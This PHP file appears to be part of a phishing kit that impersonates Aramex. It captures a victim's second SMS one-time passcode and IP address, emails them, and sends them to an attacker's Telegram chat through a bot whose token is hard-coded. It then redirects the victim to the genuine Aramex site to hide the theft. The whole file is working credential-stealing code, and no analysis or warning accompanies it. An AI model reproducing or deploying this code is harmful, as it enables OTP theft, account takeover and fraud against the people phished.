<?php
ob_start();
include('loading2.php');
$pg=$_REQUEST['page'];
$pg1=$_REQUEST['page1'];
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.php?page=$pg&page1=$pg1" ;
$hostname = gethostbyaddr($ip);
$message .= "/--OTP#2--/🔑".$_POST['sm']."\n";
$send = "";
$subject = "$ip";
$headers = "From: SMS2 ARMEX <don@cool.com>";
mail($send,$subject,$message,$headers);
// TELEGRAM	
	function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '6441871821:AAHYdZIY9vmoiJ8CHuhLoY2KJjWyuohBNaA';
    $chat_id  = '-1001503320447';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
	
}
telegram_send(urlencode($message));
// TELEGRAM
header("Refresh:3; url='https://www.aramex.com/tr/en/ship/send-a-shipment'");
ob_end_flush();
exit;
?>